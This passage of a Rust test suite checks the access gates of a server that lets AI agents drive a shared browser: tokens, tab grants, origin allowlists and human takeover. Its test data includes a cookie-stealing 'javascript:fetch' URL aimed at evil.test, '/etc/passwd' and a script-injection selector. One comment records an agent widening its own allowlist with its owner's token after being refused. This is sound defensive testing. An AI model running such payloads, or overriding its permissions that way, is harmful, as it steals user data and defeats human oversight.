            }
            Ok(json!({
                "handed_back": false,
                "human_attached": attached,
                "waited_seconds": park,
                "message": if attached {
                    "The human is still driving. Call request_human_takeover again to keep waiting."
                } else {
                    "Nobody took the wheel in time; control is back with you. Ask again, or tell \
                     the human what you need in chat."
                },
                "reason": reason,
            }))
        }
        Err(e) => Err(e),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use super::super::lock::DriveLock;
    use crate::config::Config;
    use crate::db;
    use axum::body::Body;
    use axum::http::{HeaderValue, Request, StatusCode};
    use tower::ServiceExt;

    async fn test_state() -> (AppState, std::path::PathBuf) {
        let dir =
            std::env::temp_dir().join(format!("supermux-browser-tools-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let config = Config {
            swarm_reaper: Default::default(),
            data_dir: dir.clone(),
            bind: "127.0.0.1:0".parse().unwrap(),
            extra_binds: vec![],
            tls: Default::default(),
            auth_token: "test-token".to_string(),
            provider_defaults: Default::default(),
            ws: Default::default(),
            remote_callback_url: None,
            push_sub: None,
            github_token: None,
            statusline_tap: false,
            isolation_mode: crate::isolation::IsolationMode::BestEffort,
            company_isolation: Vec::new(),
            human_auth: Default::default(),
            extra_origins: Vec::new(),
        };
        let pool = db::init(&config).await.expect("init pool");
        (AppState::new(pool, config), dir)
    }

    /// A session with a hook token; `granted` also lands an enabled
    /// `shared-browser` grant (through the same DB path the store's grant
    /// endpoint uses).
    async fn seed_session(state: &AppState, session: &str, token: &str, granted: bool) {
        db::sessions::insert_minimal(&state.pool, session, "/tmp", "claude")
            .await
            .unwrap();
        db::sessions::ensure_runtime(&state.pool, session, token)
            .await
            .unwrap();
        if granted {
            let m = super::super::mcp::manifest("/tmp/server.py");
            let cols = m.to_columns();
            db::connectors::upsert(
                &state.pool,
                &m.id,
                &m.kind,
                &m.display_name,
                &m.icon,
                &m.description,
                &cols.tools_json,
                &cols.credentials_json,
                &cols.emit_json,
                "{}",
            )
            .await
            .unwrap();
            db::connectors::grant(&state.pool, session, BROWSER_ID, None, true)
                .await
                .unwrap();
        }
    }

    fn tool_request(session: &str, token: &str, tool: &str, args: Value) -> Request<Body> {
        let body = json!({ "session": session, "tool": tool, "args": args });
        let mut req = Request::builder()
            .method("POST")
            .uri("/api/hook/browser/tool")
            .body(Body::from(body.to_string()))
            .unwrap();
        req.headers_mut().insert(
            "X-Supermux-Hook-Token",
            HeaderValue::from_str(token).unwrap(),
        );
        req
    }

    /// **The 403 the owner's bot actually hit.** `folderwijzer` held a tab grant
    /// and no connector row, and its own helper got
    /// `forbidden: session 'folderwijzer' has no 'shared-browser' grant` on
    /// `list_tabs` — so the human's decision ("use my signed-in tab") was refused
    /// at the door. A lent tab is browser access at this layer too, independent
    /// of whether the implied connector grant has been written.
    #[tokio::test]
    async fn a_lent_tab_is_browser_access_at_the_hook_door() {
        let (state, dir) = test_state().await;
        // Deliberately NOT granted the connector — this is the legacy row shape.
        seed_session(&state, "folderwijzer", "tok-f", false).await;

        // Precondition: with neither grant it is refused, exactly as before.
        let resp = router_for(state.clone())
            .oneshot(tool_request("folderwijzer", "tok-f", "list_tabs", json!({})))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN, "no grant, no browser");

        // The human lends a tab — the ONLY thing that changes.
        let tab_id = db::browser_tabs::new_tab_id();
        db::browser_tabs::create(
            &state.pool,
            &tab_id,
            "https://search.google.com/search-console/",
            None,
            &["search.google.com".to_string()],
        )
        .await
        .unwrap();
        db::browser_tabs::grant(&state.pool, &tab_id, "folderwijzer", true)
            .await
            .unwrap();

        let resp = router_for(state.clone())
            .oneshot(tool_request("folderwijzer", "tok-f", "list_tabs", json!({})))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK, "a lent tab IS the grant");
        let bytes = axum::body::to_bytes(resp.into_body(), 1 << 20).await.unwrap();
        let v: Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(v["result"]["tabs"][0]["tab"], json!(tab_id), "and it can see it: {v}");

        // …and the tab gate still governs WHICH tab: a second, unlent tab is not
        // reachable just because this session now has browser access.
        let other = db::browser_tabs::new_tab_id();
        db::browser_tabs::create(&state.pool, &other, "https://mail.example.com/", None, &[])
            .await
            .unwrap();
        assert!(
            !has_tab_grant(&state, "folderwijzer", &other).await,
            "browser access is not tab access"
        );
        assert!(!state.browser.is_running().await, "and nothing spawned chrome");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// A refusal a bot can ACT on. The bare "not allowed to visit" is what sent
    /// the owner's bot to PATCH the tab's allowlist itself with his bearer token.
    #[test]
    fn the_off_allowlist_refusal_names_the_host_and_who_widens_it() {
        let msg = BrowserError::OriginNotAllowed {
            tab: "tb_x".into(),
            host: "accounts.google.com".into(),
        }
        .to_string();
        assert!(msg.contains("accounts.google.com"), "{msg}");
        assert!(msg.contains("not yours to widen"), "{msg}");
        assert!(msg.contains("Ask them"), "{msg}");
        // The sign-in hop is the common case; naming it saves a round trip.
        assert!(msg.contains("sign-in hop"), "{msg}");
    }

    /// GATE 1 + GATE 2, and the thing that matters most about both: neither can
    /// spawn a browser. A wrong token is a 401, an ungranted session is a 403,
    /// and in both cases chrome never starts.
    #[tokio::test]
    async fn auth_and_grant_gates_refuse_before_any_chrome_can_spawn() {
        let (state, dir) = test_state().await;
        seed_session(&state, "alice", "tok-alice", false).await;
        seed_session(&state, "bob", "tok-bob", true).await;

        // Wrong token for a real session → 401.
        let resp = router_for(state.clone())
            .oneshot(tool_request("alice", "not-the-token", "read", json!({})))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

        // Bob's token cannot drive Alice's context (the per-session scope rule).
        let resp = router_for(state.clone())
            .oneshot(tool_request("alice", "tok-bob", "read", json!({})))
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "bot B's token must never authenticate bot A's browser"
        );

        // Alice's own token, but no grant → 403.
        let resp = router_for(state.clone())
            .oneshot(tool_request("alice", "tok-alice", "read", json!({})))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);

        assert!(
            !state.browser.is_running().await,
            "a refused call must never have spawned chrome"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// An unknown tool name on a granted session is a 400 — the dispatch table is
    /// closed, so a compromised MCP server cannot reach anything else.
    #[tokio::test]
    async fn the_tool_dispatch_table_is_closed() {
        let (state, dir) = test_state().await;
        seed_session(&state, "carol", "tok-carol", true).await;
        let resp = router_for(state.clone())
            .oneshot(tool_request("carol", "tok-carol", "Bash", json!({})))
            .await
            .unwrap();
        // The name is rejected before the browser is ever asked for a context.
        assert!(
            resp.status() == StatusCode::BAD_REQUEST || resp.status() == StatusCode::INTERNAL_SERVER_ERROR,
            "unknown tool must not be dispatched: {}",
            resp.status()
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_selector_can_never_break_out_of_the_expression() {
        let hostile = "a\"); alert(1); //";
        let js = js_string(hostile);
        assert!(js.starts_with('"') && js.ends_with('"'));
        assert!(js.contains("\\\""), "the inner quote is escaped: {js}");
    }

    #[test]
    fn clip_counts_chars_not_bytes() {
        let (s, cut) = clip("héllo wörld", 5);
        assert_eq!(s.chars().count(), 5);
        assert!(cut);
        let (s, cut) = clip("short", 40);
        assert_eq!(s, "short");
        assert!(!cut);
    }

    #[test]
    fn the_lock_refusal_maps_to_409_and_a_quota_to_429() {
        let e = browser_err(BrowserError::HumanDriving { subject: "alice".into() });
        assert!(matches!(e, AppError::Conflict(_)), "human-driving is a 409");
        let e = browser_err(BrowserError::TooManyContexts { max: 4 });
        assert!(matches!(e, AppError::TooManyRequests(_)));
        let e = browser_err(BrowserError::NoSuchContext("bob".into()));
        assert!(matches!(e, AppError::NotFound(_)));
    }

    #[test]
    fn the_tab_refusals_map_to_the_right_status_and_leak_no_existence() {
        // **No oracle.** An ungranted agent must not be able to tell a real tab
        // id from a made-up one, so both are 403 — never 404.
        let e = browser_err(BrowserError::NotGrantedForTab {
            session: "alice".into(),
            tab: "tb_real".into(),
        });
        assert!(matches!(e, AppError::Forbidden(_)), "not-granted is a 403");
        let e = browser_err(BrowserError::NoSuchTab("tb_madeup".into()));
        assert!(
            matches!(e, AppError::Forbidden(_)),
            "a missing tab must ALSO be 403, or the 404 is the oracle"
        );
        // Honest expiry and origin scope are distinct, actionable outcomes.
        let e = browser_err(BrowserError::TabNeedsLogin { tab: "tb_x".into() });
        assert!(matches!(e, AppError::Conflict(_)));
        let e = browser_err(BrowserError::OriginNotAllowed {
            tab: "tb_x".into(),
            host: "evil.test".into(),
        });
        assert!(matches!(e, AppError::Forbidden(_)));
        let e = browser_err(BrowserError::TooManyTabs { max: 16 });
        assert!(matches!(e, AppError::TooManyRequests(_)));
    }

    /// §8.4's parser, on its own. Everything `host_of` cannot reason about must
    /// come back `None`, because the caller turns `None` into a refusal.
    #[test]
    fn only_http_urls_yield_a_host_and_everything_else_is_refused() {
        assert_eq!(host_of("https://Mail.Example.com/inbox"), Some("mail.example.com".into()));
        assert_eq!(host_of("http://example.com:8080/x?y#z"), Some("example.com".into()));
        // userinfo is not the host — `https://mail.example.com@evil.test/` goes
        // to evil.test, and a naive parser reads it the other way round.
        assert_eq!(host_of("https://mail.example.com@evil.test/"), Some("evil.test".into()));
        assert_eq!(host_of("https://[2001:db8::1]:443/"), Some("[2001:db8::1]".into()));
        for hostile in [
            "javascript:fetch('//evil.test?c='+document.cookie)",
            "data:text/html,<script>1</script>",
            "file:///etc/passwd",
            "/relative/path",
            "https://",
            "",
        ] {
            assert_eq!(host_of(hostile), None, "{hostile} must not yield a host");
        }
    }

    /// **The landing check's decision table**, without a browser.
    ///
    /// This is the predicate that decides whether authenticated page content
    /// leaves the server, so every branch is pinned here.
    #[test]
    fn a_page_that_drifts_off_the_allowlist_is_detected_and_the_read_verbs_refuse() {
        let origins = vec!["mail.example.com".to_string(), ".corp.example".to_string()];

        // On-allowlist landings are fine, exact and suffix alike.
        assert_eq!(landing_drift("https://mail.example.com/inbox", &origins), None);
        assert_eq!(landing_drift("https://sso.corp.example/x", &origins), None);
        // The empty page has no host and no content.
        assert_eq!(landing_drift("about:blank", &origins), None);
        assert_eq!(landing_drift("", &origins), None);

        // THE HOLE: the tab moved to a host nobody allowed. `navigate` never saw
        // this URL — a click or the page's own JS put it there.
        assert_eq!(
            landing_drift("https://evil.test/collect", &origins),
            Some("evil.test".to_string())
        );
        // A near-miss host must not pass a suffix check.
        assert_eq!(
            landing_drift("https://notmail.example.com/", &origins),
            Some("notmail.example.com".to_string())
        );
        // A scheme with NO host cannot satisfy a host allowlist. Fail closed —
        // "the check does not apply" must never read as "allowed".
        for hostless in [
            "data:text/html,<h1>hi",
            "file:///etc/passwd",
            "javascript:1",
        ] {
            assert_eq!(
                landing_drift(hostless, &origins),
                Some(String::new()),
                "{hostless} must count as drift"
            );
        }

        // The content verbs refuse; the verbs whose page already moved annotate.
        for refused in ["read", "screenshot", "navigate"] {
            assert!(drift_refuses(refused), "{refused} must refuse on drift");
        }
        for annotated in ["click", "request_human_takeover"] {
            assert!(!drift_refuses(annotated), "{annotated} must not refuse");
        }
        // A verb nobody has taught this function about is refused: a NEW content
        // verb must not bypass the allowlist by being new.
        assert!(drift_refuses("some_future_read_verb"));
    }

    /// **T7 — the confused-deputy guard.** A session with the connector grant but
    /// NO per-tab grant is refused on EVERY verb that names a tab, `read` and
    /// `screenshot` explicitly included: on an authenticated tab, reading IS the
    /// exfiltration. And it is refused *before* any chrome can spawn.
    #[tokio::test]
    async fn an_ungranted_session_gets_403_on_every_verb_naming_a_tab_including_reads() {
        let (state, dir) = test_state().await;
        seed_session(&state, "alice", "tok-alice", true).await;
        // A real tab exists, and alice has NO grant on it.
        crate::db::browser_tabs::create(
            &state.pool,
            "tb_realtab0001",
            "https://mail.example.com/",
            None,
            &["mail.example.com".to_string()],
        )
        .await
        .unwrap();

        for tool in ["read", "screenshot", "navigate", "click", "request_human_takeover"] {
            let (st, v) = call(
                &state,
                "alice",
                "tok-alice",
                tool,
                json!({
                    "tab": "tb_realtab0001",
                    "url": "https://mail.example.com/",
                    "selector": "#x",
                    "reason": "hi",
                }),
            )
            .await;
            assert_eq!(
                st,
                StatusCode::FORBIDDEN,
                "{tool} on an ungranted tab must be 403, got {v}"
            );
        }
        // A made-up tab id is the SAME refusal — no existence oracle.
        let (st, _) = call(
            &state,
            "alice",
            "tok-alice",
            "read",
            json!({ "tab": "tb_doesnotexist99" }),
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN);
        // Decisively: none of that spawned a browser.
        assert!(!state.browser.is_running().await, "no chrome may be spawned");

        // ── and the grant flips it ──────────────────────────────────────────
        crate::db::browser_tabs::grant(&state.pool, "tb_realtab0001", "alice", true)
            .await
            .unwrap();
        assert!(
            has_tab_grant(&state, "alice", "tb_realtab0001").await,
            "the per-tab grant is what unlocks the tab"
        );
        // …and the tab grant STANDS ON ITS OWN. It used to require the connector
        // grant as well, and that second requirement is exactly the bug: the
        // human lent a tab in the workspace, the store row was never written, and
        // the bot got a bare 403 on `list_tabs` while holding the tab. Both are
        // deliberate human acts; a lend is not a lesser one. So revoking the
        // store card does NOT retract a tab the human is still lending —
        // un-lending the tab does (asserted below), which is the control that
        // actually names this tab.
        db_connectors::grant(&state.pool, "alice", BROWSER_ID, None, false)
            .await
            .unwrap();
        assert!(
            has_tab_grant(&state, "alice", "tb_realtab0001").await,
            "a tab the human is lending is access on its own"
        );
        // The per-tab grant remains the ONLY thing that names a tab: revoke it
        // and every verb on it is refused again, connector grant or not.
        crate::db::browser_tabs::revoke(&state.pool, "tb_realtab0001", "alice")
            .await
            .unwrap();
        assert!(
            !has_tab_grant(&state, "alice", "tb_realtab0001").await,
            "un-lending the tab is what takes it away"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// **T9 — `list_tabs` hides what it must not reveal**, and **T8** — company
    /// containment is enforced server-side, not merely hidden.
    #[tokio::test]
    async fn list_tabs_shows_only_granted_tabs_and_never_crosses_a_company() {
        let (state, dir) = test_state().await;
        seed_session(&state, "alice", "tok-alice", true).await;

        let tabs = &state.pool;
        crate::db::browser_tabs::create(tabs, "tb_granted00001", "https://a.test/", None, &[])
            .await
            .unwrap();
        crate::db::browser_tabs::create(tabs, "tb_ungranted001", "https://b.test/", None, &[])
            .await
            .unwrap();
        // A tab owned by ANOTHER company. Alice is an HQ session (company_id
        // NULL), so even an explicit own-slug grant must NOT reach it.
        let other = crate::db::companies::create(&state.pool, "acme", "Acme", "/tmp/acme")
            .await
            .unwrap();
        crate::db::browser_tabs::create(
            tabs,
            "tb_othercompany",
            "https://c.test/",
            Some(other.id),
            &[],
        )
        .await
        .unwrap();
        crate::db::browser_tabs::grant(tabs, "tb_granted00001", "alice", true)
            .await
            .unwrap();
        crate::db::browser_tabs::grant(tabs, "tb_othercompany", "alice", true)
            .await
            .unwrap();

        let (st, v) = call(&state, "alice", "tok-alice", "list_tabs", json!({})).await;
        assert_eq!(st, StatusCode::OK, "{v}");
        let listed: Vec<String> = v["result"]["tabs"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["tab"].as_str().unwrap_or_default().to_string())
            .collect();
        assert_eq!(
            listed,
            vec!["tb_granted00001".to_string()],
            "only granted, same-company tabs may be listed: {v}"
        );
        // The same predicate gates USE, so discovery and enforcement agree.
        assert!(has_tab_grant(&state, "alice", "tb_granted00001").await);
        assert!(!has_tab_grant(&state, "alice", "tb_ungranted001").await);
        assert!(
            !has_tab_grant(&state, "alice", "tb_othercompany").await,
            "a cross-company grant must be refused at CALL TIME, not just hidden"
        );

        // A session with no tab grants gets an empty list, not an error and not
        // a hint that other tabs exist.
        seed_session(&state, "bob", "tok-bob", true).await;
        let (st, v) = call(&state, "bob", "tok-bob", "list_tabs", json!({})).await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(v["result"]["count"], json!(0), "{v}");

        // And a session without even the CONNECTOR grant cannot list at all.
        seed_session(&state, "carol", "tok-carol", false).await;
        let (st, _) = call(&state, "carol", "tok-carol", "list_tabs", json!({})).await;
        assert_eq!(st, StatusCode::FORBIDDEN);
        std::fs::remove_dir_all(&dir).ok();
    }

    /// **T10 — honest expiry.** A `needs_login` tab refuses every agent verb
    /// rather than serving a login wall as if it were data. Fail closed, and
    /// still before any chrome spawns.
    #[tokio::test]
    async fn a_tab_in_needs_login_refuses_agent_verbs() {
        let (state, dir) = test_state().await;
        seed_session(&state, "alice", "tok-alice", true).await;
        crate::db::browser_tabs::create(
            &state.pool,
            "tb_expired00001",
            "https://mail.example.com/",
            None,
            &["mail.example.com".to_string()],
        )
        .await
        .unwrap();
        crate::db::browser_tabs::grant(&state.pool, "tb_expired00001", "alice", true)
            .await
            .unwrap();
        crate::db::browser_tabs::update(
            &state.pool,
            "tb_expired00001",
            &crate::db::browser_tabs::TabPatch {
                login_state: Some(crate::db::browser_tabs::LOGIN_NEEDED.into()),
                ..Default::default()
            },
        )
        .await
        .unwrap();

        for tool in ["read", "screenshot", "navigate", "click"] {
            let (st, v) = call(
                &state,
                "alice",
                "tok-alice",
                tool,
                json!({ "tab": "tb_expired00001", "url": "https://mail.example.com/" }),
            )
            .await;
            assert_eq!(st, StatusCode::CONFLICT, "{tool} on a lapsed tab: {v}");
        }
        assert!(!state.browser.is_running().await);
        // The blockage is raised through the affordance the human already knows.
        assert!(
            state
                .session_activity("alice")
                .and_then(|a| a.browser_takeover)
                .is_some(),
            "a lapsed tab must raise the in-chat ask, not fail silently"
        );
        // It is STILL listed, with its state, so the agent can report accurately.
        let (_, v) = call(&state, "alice", "tok-alice", "list_tabs", json!({})).await;
        assert_eq!(v["result"]["tabs"][0]["login_state"], json!("needs_login"), "{v}");
        std::fs::remove_dir_all(&dir).ok();
    }

    // ── FINDING 2: the hand-off must not lie ────────────────────────────────

    #[test]
    fn only_an_explicit_hand_back_is_reported_as_finished() {
        let ok = handback_result(Some(HandOff::Explicit), "https://bank/ok", "sign in");
        assert_eq!(ok["handed_back"], json!(true));
        assert_eq!(ok["human_disconnected"], json!(false));
        assert!(
            ok["message"].as_str().unwrap().contains("Continue from this page"),
            "{ok}"
        );

        // Every other way the wheel comes back is a human who is simply GONE.
        for gone in [
            Some(HandOff::Disconnected),
            Some(HandOff::Abandoned),
            None,
        ] {
            let v = handback_result(gone, "https://bank/half-filled", "sign in");
            assert_eq!(v["handed_back"], json!(false), "{gone:?} → {v}");
            assert_eq!(v["human_disconnected"], json!(true), "{gone:?} → {v}");
            let msg = v["message"].as_str().unwrap();
            assert!(msg.contains("disconnected"), "{gone:?} → {msg}");
            assert!(
                msg.contains("may be incomplete"),
                "the agent must be warned the page is unverified: {msg}"
            );
            assert!(
                !msg.contains("finished"),
                "never claim the human finished when nobody said so: {msg}"
            );
            // The URL is still reported — the agent may need it to check state.
            assert_eq!(v["url"], json!("https://bank/half-filled"));
        }
    }

    /// The exact sequence the takeover socket produces for a dropped phone:
    /// takeover → (no hand-back frame) → teardown release. The parked caller
    /// reads the provenance off the lock, so this is the end-to-end statement of
    /// FINDING 2 without a browser.
    #[test]
    fn a_dropped_socket_and_a_hand_back_reach_the_parked_caller_differently() {
        let lock = DriveLock::new("driver");

        lock.request_human_takeover();
        lock.release_to_agent(HandOff::Explicit); // the "Hand back" button
        let v = handback_result(lock.last_handoff(), "u", "r");
        assert_eq!(v["handed_back"], json!(true));

        lock.request_human_takeover();
        lock.release_to_agent(HandOff::Disconnected); // the tab/network died
        let v = handback_result(lock.last_handoff(), "u", "r");
        assert_eq!(v["handed_back"], json!(false));
        assert_eq!(v["human_disconnected"], json!(true));
    }

    // ── real-chrome end-to-end (phase 3's whole claim) ──────────────────────

    /// A page whose content is unambiguous to read back, and which can prove a
    /// click landed.
    fn tool_page() -> String {
        let html = "<title>Phase3</title><body><h1 id=h>hello-from-phase-3</h1><button id=b onclick=\"document.getElementById('h').textContent='clicked-ok'\">go</button></body>";
        format!("data:text/html,{}", html.replace(' ', "%20"))
    }

    async fn call(state: &AppState, session: &str, token: &str, tool: &str, args: Value) -> (StatusCode, Value) {
        let resp = router_for(state.clone())
            .oneshot(tool_request(session, token, tool, args))
            .await
            .unwrap();
        let status = resp.status();
        let bytes = axum::body::to_bytes(resp.into_body(), 4 * 1024 * 1024)
            .await
            .unwrap();
        let v: Value = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
        (status, v)
    }

    /// REAL-CHROME phase-3 end-to-end. Ignored by default (spawns the pinned
    /// `chrome-headless-shell`); run with
    /// `cargo test -- --ignored real_chrome_tool_loop`.
    ///
    /// Drives the ACTUAL endpoint the MCP server calls — hook-token auth, grant
    /// check, `BrowserService`, drive lock — and proves the whole phase-3 loop:
    ///
    /// 1. `navigate` → `read` returns the page's real text; `screenshot` returns
    ///    real JPEG bytes; `click` mutates the live DOM.
    /// 2. While `HumanDriving`, EVERY agent tool is refused with `409` — acting
    ///    and reading alike (the human's login page is not the agent's to read).
    /// 3. `request_human_takeover` raises the in-chat ask in session state AND
    ///    parks the agent; a simulated hand-back wakes it and clears the ask.
    /// 4. Teardown leaves no orphan chrome.
    #[tokio::test]
    #[ignore = "spawns a real chrome-headless-shell; run with --ignored on a box that has the pinned binary"]
    async fn real_chrome_tool_loop_reads_clicks_screenshots_and_parks_for_a_human() {
        fn pid_alive(pid: u32) -> bool {
            std::path::Path::new(&format!("/proc/{pid}")).exists()
        }

        let (state, dir) = test_state().await;
        seed_session(&state, "driver", "tok-driver", true).await;

        // ── 1. the agent's own loop ─────────────────────────────────────────
        let (st, v) = call(&state, "driver", "tok-driver", "navigate", json!({ "url": tool_page() })).await;
        assert_eq!(st, StatusCode::OK, "navigate: {v}");
        assert_eq!(v["result"]["navigated"], json!(true));
        assert_eq!(v["result"]["title"], json!("Phase3"), "read the live title back");

        let (st, v) = call(&state, "driver", "tok-driver", "read", json!({})).await;
        assert_eq!(st, StatusCode::OK, "read: {v}");
        let text = v["result"]["text"].as_str().unwrap_or_default();
        assert!(text.contains("hello-from-phase-3"), "read the real page text: {text:?}");

        let (st, v) = call(&state, "driver", "tok-driver", "screenshot", json!({})).await;
        assert_eq!(st, StatusCode::OK, "screenshot: {v}");
        let b64 = v["result"]["data"].as_str().unwrap_or_default();
        assert!(b64.len() > 1000, "screenshot returned {} base64 chars", b64.len());
        assert_eq!(v["result"]["mime_type"], json!("image/jpeg"));

        let (st, v) = call(&state, "driver", "tok-driver", "click", json!({ "selector": "#b" })).await;
        assert_eq!(st, StatusCode::OK, "click: {v}");
        let (_, v) = call(&state, "driver", "tok-driver", "read", json!({ "selector": "#h" })).await;
        assert_eq!(
            v["result"]["text"].as_str().unwrap_or_default().trim(),
            "clicked-ok",
            "the click mutated the real DOM"
        );

        let pid = state.browser.chrome_pid().await.expect("a chrome pid");
        let ctx = state.browser.context("driver").await.expect("context");

        // ── 2. the lock refuses the agent while the human drives ────────────
        ctx.lock().request_human_takeover();
        for (tool, args) in [
            ("navigate", json!({ "url": "about:blank" })),
            ("click", json!({ "selector": "#b" })),
            ("read", json!({})),
            ("screenshot", json!({})),
        ] {
            let (st, v) = call(&state, "driver", "tok-driver", tool, args).await;
            assert_eq!(st, StatusCode::CONFLICT, "{tool} must be refused while HumanDriving: {v}");
        }
        // …and the page is untouched: the refused navigate never happened.
        ctx.lock().release_to_agent(HandOff::Explicit);
        let (_, v) = call(&state, "driver", "tok-driver", "read", json!({ "selector": "#h" })).await;
        assert_eq!(
            v["result"]["text"].as_str().unwrap_or_default().trim(),
            "clicked-ok",
            "nothing the agent asked for while refused reached the page"
        );

        // ── 3. the hand-off: ask → park → hand back → resume ────────────────
        let parked = {
            let state = state.clone();
            tokio::spawn(async move {
                call(
                    &state,
                    "driver",
                    "tok-driver",
                    "request_human_takeover",
                    json!({ "reason": "sign in and approve the 2FA push", "timeout_seconds": 30 }),
                )
                .await
            })
        };
        // The ask reaches session state (this IS the in-chat card's source).
        let mut ask = None;
        for _ in 0..100 {
            if let Some(a) = state.session_activity("driver").and_then(|a| a.browser_takeover) {
                ask = Some(a);
                break;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        let ask = ask.expect("the takeover ask reached session state");
        assert_eq!(ask.session, "driver");
        assert!(ask.reason.contains("2FA"), "the agent's own sentence: {}", ask.reason);
        assert_eq!(ctx.lock().mode(), super::super::lock::DriveMode::HumanDriving);

        // The human finishes and presses **Hand back** — the explicit control
        // frame (what `ClientMsg::HandBack` does in the takeover socket).
        tokio::time::sleep(Duration::from_millis(100)).await;
        ctx.lock().release_to_agent(HandOff::Explicit);

        let (st, v) = parked.await.unwrap();
        assert_eq!(st, StatusCode::OK, "the parked call returns on hand-back: {v}");
        assert_eq!(v["result"]["handed_back"], json!(true));
        assert_eq!(v["result"]["human_disconnected"], json!(false));
        assert!(
            v["result"]["message"].as_str().unwrap_or_default().contains("handed the wheel back"),
            "an EXPLICIT hand-back is the one case we may report as finished: {v}"
        );
        assert!(
            state.session_activity("driver").and_then(|a| a.browser_takeover).is_none(),
            "the card is cleared once the wheel comes back"
        );

        // ── 3b. FINDING 2: the human's phone drops mid sign-in ──────────────
        // Same code path, same released lock — but the socket went away without
        // a hand-back frame, so the agent must NOT be told the login finished.
        let parked = {
            let state = state.clone();
            tokio::spawn(async move {
                call(
                    &state,
                    "driver",
                    "tok-driver",
                    "request_human_takeover",
                    json!({ "reason": "sign in", "timeout_seconds": 30 }),
                )
                .await
            })
        };
        for _ in 0..100 {
            if ctx.lock().mode() == super::super::lock::DriveMode::HumanDriving {
                break;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
        // What `takeover_socket`'s teardown does on ANY transport exit.
        ctx.lock().release_to_agent(HandOff::Disconnected);

        let (st, v) = parked.await.unwrap();
        assert_eq!(st, StatusCode::OK, "the parked call still returns: {v}");
        assert_eq!(
            v["result"]["handed_back"],
            json!(false),
            "a dropped connection is NOT a hand-back: {v}"
        );
        assert_eq!(v["result"]["human_disconnected"], json!(true));
        assert!(
            v["result"]["message"].as_str().unwrap_or_default().contains("disconnected"),
            "the agent must be told the page may be incomplete: {v}"
        );

        // The agent really is driving again.
        let (st, _) = call(&state, "driver", "tok-driver", "read", json!({})).await;
        assert_eq!(st, StatusCode::OK, "the agent resumes after the hand-back");

        // ── 4. no orphan chrome ─────────────────────────────────────────────
        state.browser.shutdown().await;
        for _ in 0..50 {
            if !pid_alive(pid) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert!(!pid_alive(pid), "chrome {pid} survived shutdown — orphan");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// REAL-CHROME (FINDING 1). **The teardown wiring, through the production
    /// paths** — the bug was not that `close_context` was wrong, it was that
    /// NOTHING called it, so a context outlived its agent forever.
    ///
    /// Each leg opens a real page through the real tool endpoint and then fires
    /// one real teardown path:
    ///
    /// * the `SessionEnd` hook, POSTed to the actual hook route;
    /// * `lifecycle::stop`;
    /// * `AppState::forget_session` (the choke point delete AND archive use);
    /// * `AppState::rename_session` (the still-alive-but-renamed case).
    #[tokio::test]
    #[ignore = "spawns a real chrome-headless-shell; run with --ignored on a box that has the pinned binary"]
    async fn real_chrome_every_teardown_path_disposes_the_agents_context() {
        let (state, dir) = test_state().await;

        /// Open a page for `session` through the real endpoint.
        async fn open_page(state: &AppState, session: &str, token: &str) {
            let (st, v) = call(state, session, token, "navigate", json!({ "url": tool_page() })).await;
            assert_eq!(st, StatusCode::OK, "navigate for {session}: {v}");
            assert_eq!(
                state.browser.context_count().await,
                1,
                "{session} should hold exactly one context"
            );
        }

        /// The teardown is fire-and-forget, so give it a bounded moment.
        async fn assert_disposed(state: &AppState, path: &str) {
            for _ in 0..200 {
                if state.browser.context_count().await == 0 {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(25)).await;
            }
            assert_eq!(
                state.browser.context_count().await,
                0,
                "{path} must dispose the session's browser context"
            );
            assert!(
                state.browser.idle_armed().await,
                "{path} must leave the idle reaper armed (it only fires on an EMPTY map)"
            );
        }

        // ── the SessionEnd hook, through the real route ─────────────────────
        seed_session(&state, "ender", "tok-ender", true).await;
        open_page(&state, "ender", "tok-ender").await;
        let hook = Request::builder()
            .method("POST")
            .uri("/api/_internal/hook")
            .header("X-Supermux-Hook-Token", "tok-ender")
            .body(Body::from(
                json!({ "session": "ender", "event": "session_end", "payload": {} }).to_string(),
            ))
            .unwrap();
        let resp = crate::hooks::router_for(state.clone()).oneshot(hook).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK, "the hook must be accepted");
        assert_disposed(&state, "SessionEnd hook").await;

        // ── lifecycle::stop ─────────────────────────────────────────────────
        seed_session(&state, "stopper", "tok-stopper", true).await;
        open_page(&state, "stopper", "tok-stopper").await;
        let _ = crate::sessions::lifecycle::stop(&state, "stopper").await;
        assert_disposed(&state, "lifecycle::stop").await;

        // ── forget_session (delete + archive) ────────────────────────────────
        seed_session(&state, "deleted", "tok-deleted", true).await;
        open_page(&state, "deleted", "tok-deleted").await;
        state.forget_session("deleted");
        assert_disposed(&state, "forget_session (delete/archive)").await;

        // ── rename_session (the still-alive-but-renamed case) ───────────────
        seed_session(&state, "oldname", "tok-oldname", true).await;
        open_page(&state, "oldname", "tok-oldname").await;
        state.rename_session("oldname", "newname");
        assert_disposed(&state, "rename_session").await;

        state.browser.shutdown().await;
        std::fs::remove_dir_all(&dir).ok();
    }

    /// **T11, real chrome — the origin allowlist is a wall, not a hint.**
    ///
    /// Drives the ACTUAL endpoint against a granted workspace tab and asserts
    /// the three things §8.4 claims: an on-allowlist navigation works, an
    /// off-allowlist one is 403 (and does not move the page), and a granted read
